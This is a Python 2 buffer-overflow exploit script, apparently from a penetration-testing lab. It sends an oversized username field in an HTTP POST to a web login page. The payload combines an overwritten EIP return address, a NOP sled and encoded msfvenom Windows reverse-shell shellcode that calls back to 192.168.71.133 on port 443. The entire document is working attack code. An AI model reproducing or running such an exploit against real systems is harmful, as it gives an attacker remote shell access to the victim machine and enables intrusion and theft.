#!/usr/bin/python

import socket
try:
    print "\nSending payload"
    # msf-pattern_offset -l 1000 -q 42306142
    size = 780

    # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.71.133 LPORT=443 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"
    shellcode = ("\xdb\xc9\xd9\x74\x24\xf4\x5a\x29\xc9\xb1\x52\xb8\x0c\x89\x9d"
                 "\x39\x31\x42\x17\x83\xea\xfc\x03\x4e\x9a\x7f\xcc\xb2\x74\xfd"
                 "\x2f\x4a\x85\x62\xb9\xaf\xb4\xa2\xdd\xa4\xe7\x12\x95\xe8\x0b"
                 "\xd8\xfb\x18\x9f\xac\xd3\x2f\x28\x1a\x02\x1e\xa9\x37\x76\x01"
                 "\x29\x4a\xab\xe1\x10\x85\xbe\xe0\x55\xf8\x33\xb0\x0e\x76\xe1"
                 "\x24\x3a\xc2\x3a\xcf\x70\xc2\x3a\x2c\xc0\xe5\x6b\xe3\x5a\xbc"
                 "\xab\x02\x8e\xb4\xe5\x1c\xd3\xf1\xbc\x97\x27\x8d\x3e\x71\x76"
                 "\x6e\xec\xbc\xb6\x9d\xec\xf9\x71\x7e\x9b\xf3\x81\x03\x9c\xc0"
                 "\xf8\xdf\x29\xd2\x5b\xab\x8a\x3e\x5d\x78\x4c\xb5\x51\x35\x1a"
                 "\x91\x75\xc8\xcf\xaa\x82\x41\xee\x7c\x03\x11\xd5\x58\x4f\xc1"
                 "\x74\xf9\x35\xa4\x89\x19\x96\x19\x2c\x52\x3b\x4d\x5d\x39\x54"
                 "\xa2\x6c\xc1\xa4\xac\xe7\xb2\x96\x73\x5c\x5c\x9b\xfc\x7a\x9b"
                 "\xdc\xd6\x3b\x33\x23\xd9\x3b\x1a\xe0\x8d\x6b\x34\xc1\xad\xe7"
                 "\xc4\xee\x7b\xa7\x94\x40\xd4\x08\x44\x21\x84\xe0\x8e\xae\xfb"
                 "\x11\xb1\x64\x94\xb8\x48\xef\x5b\x94\x15\x6a\x33\xe7\x99\x75"
                 "\x7f\x6e\x7f\x1f\x6f\x27\x28\x88\x16\x62\xa2\x29\xd6\xb8\xcf"
                 "\x6a\x5c\x4f\x30\x24\x95\x3a\x22\xd1\x55\x71\x18\x74\x69\xaf"
                 "\x34\x1a\xf8\x34\xc4\x55\xe1\xe2\x93\x32\xd7\xfa\x71\xaf\x4e"
                 "\x55\x67\x32\x16\x9e\x23\xe9\xeb\x21\xaa\x7c\x57\x06\xbc\xb8"
                 "\x58\x02\xe8\x14\x0f\xdc\x46\xd3\xf9\xae\x30\x8d\x56\x79\xd4"
                 "\x48\x95\xba\xa2\x54\xf0\x4c\x4a\xe4\xad\x08\x75\xc9\x39\x9d"
                 "\x0e\x37\xda\x62\xc5\xf3\xea\x28\x47\x55\x63\xf5\x12\xe7\xee"
                 "\x06\xc9\x24\x17\x85\xfb\xd4\xec\x95\x8e\xd1\xa9\x11\x63\xa8"
                 "\xa2\xf7\x83\x1f\xc2\xdd")

    eip = "\x83\x0c\x09\x10"
    offset = "B" * 4
    nops = "\x90" * 10

    payload = "A" * size + eip + offset + nops + shellcode

    content = "username=" + payload + "&password=A"
    buffer = "POST /login HTTP/1.1\r\n"
    buffer += "Host: IP\r\n"
    buffer += "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
    buffer += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    buffer += "Accept-Language: en-US,en;q=0.5\r\n"
    buffer += "Referer: http://IP/login\r\n"
    buffer += "Connection: close\r\n"
    buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
    buffer += "Content-Length: "+str(len(content))+"\r\n"
    buffer += "\r\n"

    buffer += content
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect(("IP", 80))
    s.send(buffer)

    s.close()
    print "\nDone!"

except:
    print "Could not connect!"
